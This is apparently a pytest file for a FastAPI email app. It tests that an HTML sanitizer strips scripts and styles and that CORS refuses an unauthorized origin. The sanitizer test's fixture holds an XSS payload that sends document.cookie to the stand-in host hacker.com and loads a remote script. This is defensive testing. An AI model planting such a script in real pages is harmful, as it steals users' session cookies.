from fastapi.testclient import TestClient

from app.main import app
from app.services.gmail.sync import clean_html_body

client = TestClient(app)


def test_html_xss_stripping():
    """
    Test that the backend BeautifulSoup cleaner correctly strips out malicious
    Javascript and style tags from raw HTML emails.
    """
    malicious_html = """
    <html>
        <head>
            <style>body { background-color: black; }</style>
        </head>
        <body>
            <h1>Invoice Attached</h1>
            <p>Please see the attached invoice.</p>
            <script>
                fetch('http://hacker.com/steal?cookie=' + document.cookie);
            </script>
            <script src="http://hacker.com/malicious.js"></script>
        </body>
    </html>
    """

    cleaned = clean_html_body(malicious_html)

    # Assert that the scripts and styles are completely gone
    assert "<script>" not in cleaned
    assert "hacker.com" not in cleaned
    assert "background-color" not in cleaned

    # Assert that the actual text content remains
    assert "Invoice Attached" in cleaned
    assert "Please see the attached invoice." in cleaned


def test_cors_configuration():
    """
    Test that the API rejects cross-origin requests from unauthorized domains,
    but accepts them from the authorized Vite frontend (localhost:5173).
    """
    # Test unauthorized origin
    headers_unauthorized = {
        "Origin": "http://malicious-website.com",
        "Access-Control-Request-Method": "GET",
    }
    response_unauth = client.options("/", headers=headers_unauthorized)

    # CORS middleware won't block the OPTIONS request completely,
    # but it will omit the 'access-control-allow-origin' header for unauthorized domains.
    assert (
        "access-control-allow-origin" not in response_unauth.headers
        or response_unauth.headers.get("access-control-allow-origin")
        != "http://malicious-website.com"
    )

    # Test authorized origin
    headers_authorized = {
        "Origin": "http://localhost:5173",
        "Access-Control-Request-Method": "GET",
    }
    response_auth = client.options("/", headers=headers_authorized)

    # Should echo back the allowed origin
    assert (
        response_auth.headers.get("access-control-allow-origin")
        == "http://localhost:5173"
    )
